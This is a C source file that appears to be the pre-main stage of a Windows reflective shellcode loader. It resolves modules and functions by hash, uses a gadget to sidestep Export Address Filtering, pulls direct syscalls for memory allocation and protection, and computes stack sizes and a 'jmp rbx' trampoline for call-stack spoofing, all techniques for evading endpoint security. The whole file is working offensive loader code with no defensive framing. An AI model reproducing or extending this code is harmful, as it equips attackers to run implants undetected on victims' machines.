#include <windows.h>

#include "Ntdll.h"
#include "Instance.h"
#include "Common.h"
#include "PreHash.h"
#include "Macros.h"

/*
    Resolve needed function for reflective loading
*/
D_SEC(B)
BOOL PreMain(
    _In_ PVOID Param
    )
{
    INSTANCE    Inst;
    PVOID	    pGadgetRead = NULL;

    Inst.Info.StartAddr     = GetShellcodeStart();
    Inst.Info.End           = GetShellcodeEnd();
    Inst.Info.dwSize        = C_DW64(Inst.Info.End) - C_DW64(Inst.Info.StartAddr);

    PVOID pKernel32    = ResolveModuleAddressWithHash(HASH_Kernel32);
    PVOID pNtdll       = ResolveModuleAddressWithHash(HASH_Ntdll);
    PVOID pKernelbase  = ResolveModuleAddressWithHash(HASH_Kernelbase);

    if (!pKernel32 || !pNtdll || !pKernelbase)
    {
        return FALSE;
    }

    pGadgetRead = ResolveEafGadgetAddress(pNtdll);
    if(!pGadgetRead)
    {
        return FALSE;
    }

    PVOID pNtAllocateVirtualMemory    = ResolveProcedureAddressWithHash(pGadgetRead, pNtdll, HASH_NtAllocateVirtualMemory);
    PVOID pNtProtectVirtualMemory     = ResolveProcedureAddressWithHash(pGadgetRead, pNtdll, HASH_NtProtectVirtualMemory);

    if(
        !pNtAllocateVirtualMemory   ||
        !pNtProtectVirtualMemory
    )
    {
        return FALSE;
    }


    if(!ResolveSyscallWithHash(
        pNtAllocateVirtualMemory,
        &Inst.Syscall.NtAllocateVirtualMemory.wSyscall,
        &Inst.Syscall.NtAllocateVirtualMemory.pAddress
    ))
    {
        return FALSE;
    }

    if(!ResolveSyscallWithHash(
        pNtProtectVirtualMemory,
        &Inst.Syscall.NtProtectVirtualMemory.wSyscall,
        &Inst.Syscall.NtProtectVirtualMemory.pAddress
    ))
    {
        return FALSE;
    }


    Inst.LoadLibraryA               = ResolveProcedureAddressWithHash(pGadgetRead, pKernel32, HASH_LoadLibraryA);
    Inst.RtlLookupFunctionEntry     = ResolveProcedureAddressWithHash(pGadgetRead, pKernel32, HASH_RtlLookupFunctionEntry);
    Inst.GetProcAddress             = ResolveProcedureAddressWithHash(pGadgetRead, pKernel32, HASH_GetProcAddress);

    PVOID pBaseThreadInitThunk      = C_DW64(ResolveProcedureAddressWithHash(pGadgetRead, pKernel32, HASH_BaseThreadInitThunk)) + 0x14;
    PVOID pRtlUserThreadStart       = C_DW64(ResolveProcedureAddressWithHash(pGadgetRead, pNtdll, HASH_RtlUserThreadStart)) + 0x21;

    Inst.RtlCreateHeap              = ResolveProcedureAddressWithHash(pGadgetRead, pNtdll, HASH_RtlCreateHeap);
    Inst.RtlAllocateHeap            = ResolveProcedureAddressWithHash(pGadgetRead, pNtdll, HASH_RtlAllocateHeap);

    if(
        !Inst.LoadLibraryA              ||
        !Inst.RtlLookupFunctionEntry    ||
        !Inst.GetProcAddress            ||
        !Inst.RtlCreateHeap             ||
        !Inst.RtlAllocateHeap           ||
        !pBaseThreadInitThunk           ||
        !pRtlUserThreadStart            
    )   
    {
        return FALSE;
    }
    

    Inst.Param.BTIT_retaddr = (PVOID)(
        C_DW64(pBaseThreadInitThunk) + 0x14);


    if(!CalculateFunctionStackSizeWrapper(&Inst, pBaseThreadInitThunk, &Inst.Param.BTIT_ss))
    {
        return FALSE;
    }

    Inst.Param.RUTS_retaddr = (PVOID)(
        C_DW64(pRtlUserThreadStart) + 0x14);

    if(!CalculateFunctionStackSizeWrapper(&Inst, pRtlUserThreadStart, &Inst.Param.RUTS_ss))
    {
        return FALSE;
    } 

    Inst.Param.trampoline = ResolveJmpRbxGadget(pKernelbase);
     if(!CalculateFunctionStackSizeWrapper(&Inst, Inst.Param.trampoline, &Inst.Param.Gadget_ss))
    {
        return FALSE;
    }

    return Main(Param, &Inst);
}